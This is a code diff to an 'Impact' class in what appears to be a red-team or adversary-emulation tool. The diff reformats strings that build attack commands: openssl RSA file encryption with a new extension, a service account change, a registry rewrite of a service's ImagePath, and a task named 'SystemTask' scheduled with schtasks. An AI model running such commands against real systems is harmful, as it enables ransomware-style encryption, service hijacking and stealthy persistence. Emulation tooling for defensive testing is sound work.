@@ -295,7 +295,8 @@ class Impact:
             elif encryption_type == "rsa":
                 result["details"]["algorithm"] = f"RSA-{key_size}"
                 result["details"]["command"] = (
-                    f"openssl rsautl -encrypt -inkey [pubkey.pem] -pubin -in [file] -out [file]{extension}"
+                    "openssl rsautl -encrypt -inkey [pubkey.pem] -pubin "
+                    f"-in [file] -out [file]{extension}"
                 )
             elif encryption_type == "xor":
                 result["details"]["algorithm"] = "Custom XOR"
@@ -660,18 +661,24 @@ class Impact:
             elif modification_type == "account":
                 modified_details["account"] = r".\LocalAccount"
                 if os.name == "nt":  # Windows
+                    pwd = self._generate_random_string(12)
                     result["details"]["command"] = (
-                        f'sc config {service_name} obj= .\\LocalAccount password= "{self._generate_random_string(12)}"'
+                        f'sc config {service_name} obj= .\\LocalAccount password= "{pwd}"'
                     )
 
             elif modification_type == "registry":
+                bin_path = modified_details["binary_path"]
+                srv_key = rf"HKLM\SYSTEM\CurrentControlSet\Services\{service_name}"
                 result["details"]["command"] = (
-                    f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}" /v ImagePath /t REG_EXPAND_SZ /d "{modified_details["binary_path"]}" /f'
+                    f'reg add "{srv_key}" /v ImagePath /t REG_EXPAND_SZ '
+                    rf'/d "{bin_path}" /f'
                 )
 
             # PowerShell alternative
+            mod_key_cap = modification_type.capitalize()
+            mod_val = modified_details[modification_type]
             result["details"]["powershell_command"] = (
-                f"Set-Service -Name {service_name} -{modification_type.capitalize()} '{modified_details[modification_type]}'"
+                f"Set-Service -Name {service_name} -{mod_key_cap} '{mod_val}'"
             )
 
             # Statistics
@@ -1010,8 +1017,10 @@ class Impact:
                     result["details"]["schedule_command"] = (
                         f'at {delay // 60} /every:once "{result["details"]["command"]}"'
                     )
+                    run_cmd = result["details"]["command"]
+                    st_time = (datetime.now() + timedelta(seconds=delay)).strftime("%H:%M")
                     result["details"]["task_scheduler"] = (
-                        f'schtasks /create /tn "SystemTask" /tr "{result["details"]["command"]}" /sc once /st {(datetime.now() + timedelta(seconds=delay)).strftime("%H:%M")}'
+                        f'schtasks /create /tn "SystemTask" /tr "{run_cmd}" /sc once /st {st_time}'
                     )
                 else:  # Linux/Unix
                     result["details"]["schedule_command"] = (
